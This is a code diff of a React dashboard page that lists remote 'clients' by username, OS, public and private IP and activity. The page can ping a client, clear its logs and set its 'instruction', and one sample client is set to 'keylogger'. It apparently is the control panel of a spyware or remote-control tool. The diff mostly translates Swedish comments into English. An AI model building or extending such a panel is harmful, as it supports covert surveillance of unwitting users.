@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { useQuery } from "@tanstack/react-query";
 import { Card, CardContent } from "@/components/ui/card";
@@ -36,17 +35,19 @@ interface FormattedClient {
   lastSeen: string;
   isActive: boolean;
   instruction: string;
+  system: string; // Add this property to match the Client interface
   [key: string]: any; // Allow for additional properties
 }
 
+// Function to fetch clients from the server
 const fetchClients = async (): Promise<{ clients: FormattedClient[] }> => {
   try {
-    // Försök att hämta klienter från server.py
+    // Try to fetch clients from server.py
     const response = await fetch('/api/get_clients');
     
     if (!response.ok) {
-      console.warn('Fallback: Simulerade klienter används eftersom servern inte svarade');
-      // Fallback till simulerade data
+      console.warn('Fallback: Simulated clients used because server did not respond');
+      // Fallback to simulated data
       return { 
         clients: generateFallbackClients() 
       };
@@ -54,22 +55,23 @@ const fetchClients = async (): Promise<{ clients: FormattedClient[] }> => {
     
     const result = await response.json();
     if (result.status === "error") {
-      throw new Error(result.message || 'Fel vid hämtning av klienter');
+      throw new Error(result.message || 'Error fetching clients');
     }
     
-    // Formatera klienter till rätt format
+    // Format clients to the correct format
     const formattedClients = Object.entries(result.clients || {}).map(([id, clientData]) => {
       const typedClientData = clientData as ClientData;
       return {
         id,
-        name: typedClientData.username || 'Okänd',
-        os: typedClientData.system || 'Okänt',
-        ip: typedClientData.public_ip || 'Okänd',
-        privateIp: typedClientData.private_ip || 'Okänd',
-        firstSeen: typedClientData.first_seen || 'Okänd',
-        lastSeen: typedClientData.last_activity || 'Okänd',
+        name: typedClientData.username || 'Unknown',
+        os: typedClientData.system || 'Unknown',
+        ip: typedClientData.public_ip || 'Unknown',
+        privateIp: typedClientData.private_ip || 'Unknown',
+        firstSeen: typedClientData.first_seen || 'Unknown',
+        lastSeen: typedClientData.last_activity || 'Unknown',
         isActive: typedClientData.is_active === true,
         instruction: typedClientData.instruction || 'standard',
+        system: typedClientData.system || 'Unknown', // Make sure system is properly mapped
         ...typedClientData  // Include all other properties (now safely typed)
       };
     });
@@ -77,14 +79,14 @@ const fetchClients = async (): Promise<{ clients: FormattedClient[] }> => {
     return { clients: formattedClients };
   } catch (error) {
     console.error("Error fetching clients:", error);
-    // Fallback till simulerade data om hämtningen misslyckades
+    // Fallback to simulated data if fetch failed
     return { 
       clients: generateFallbackClients() 
     };
   }
 };
 
-// Generera fallback-klienter för att hålla UI funktionell även utan server
+// Generate fallback clients to keep UI functional even without server
 function generateFallbackClients(): FormattedClient[] {
   return [
     {
@@ -96,7 +98,8 @@ function generateFallbackClients(): FormattedClient[] {
       firstSeen: "2023-05-15 14:30:00",
       lastSeen: "2023-05-16 08:45:00",
       isActive: true,
-      instruction: "standard"
+      instruction: "standard",
+      system: "Windows 10" // Add system field to match Client interface
     },
     {
       id: "jane_smith",
@@ -107,7 +110,8 @@ function generateFallbackClients(): FormattedClient[] {
       firstSeen: "2023-05-14 09:15:00",
       lastSeen: "2023-05-16 07:30:00",
       isActive: true,
-      instruction: "keylogger"
+      instruction: "keylogger",
+      system: "macOS" // Add system field to match Client interface
     },
     {
       id: "bob_johnson",
@@ -118,12 +122,13 @@ function generateFallbackClients(): FormattedClient[] {
       firstSeen: "2023-05-10 11:20:00",
       lastSeen: "2023-05-15 16:40:00",
       isActive: false,
-      instruction: "standard"
+      instruction: "standard",
+      system: "Linux" // Add system field to match Client interface
     }
   ];
 }
 
-// API-funktion för att pinga en klient
+// API function to ping a client
 const pingClient = async (clientId: string) => {
   try {
     const response = await fetch('/api/ping_client', {
@@ -146,7 +151,7 @@ const pingClient = async (clientId: string) => {
   }
 };
 
-// API-funktion för att rensa loggar för en klient
+// API function to clear logs for a client
 const clearClientLogs = async (clientId: string) => {
   try {
     const response = await fetch('/api/clear_logs', {
@@ -169,7 +174,7 @@ const clearClientLogs = async (clientId: string) => {
   }
 };
 
-// API-funktion för att uppdatera instruktion för en klient
+// API function to update instruction for a client
 const updateClientInstruction = async (clientId: string, instruction: string) => {
   try {
     const response = await fetch('/api/update_instruction', {
@@ -206,7 +211,7 @@ export default function Clients() {
     queryKey: ['clients'],
     queryFn: fetchClients,
     placeholderData: { clients: [] },
-    refetchInterval: 30000, // Uppdatera var 30:e sekund
+    refetchInterval: 30000, // Update every 30 seconds
   });
 
   const refreshClients = async () => {
@@ -305,9 +310,9 @@ export default function Clients() {
   const onlineCount = clients.filter(c => c.isActive).length;
   const offlineCount = clients.filter(c => !c.isActive).length;
   
-  // Om error men vi har fallback-klienter, visa ändå UI med en toast
+  // Show UI with a toast if there's an error but we have fallback clients
   if (error && clients.length > 0) {
-    toast.error("Fel vid hämtning av klientdata från servern. Visar cachade data.", {
+    toast.error("Error fetching client data from server. Showing cached data.", {
       id: "client-fetch-error",
       duration: 5000,
     });
@@ -388,6 +393,7 @@ export default function Clients() {
                   clients={filteredClients} 
                   isLoading={isLoading} 
                   onClientClick={handleClientClick} 
+                  onRefresh={refreshClients}
                 />
               )}
             </TabsContent>
@@ -408,6 +414,7 @@ export default function Clients() {
                   clients={filteredClients.filter(client => client.isActive)} 
                   isLoading={isLoading} 
                   onClientClick={handleClientClick} 
+                  onRefresh={refreshClients}
                 />
               )}
             </TabsContent>
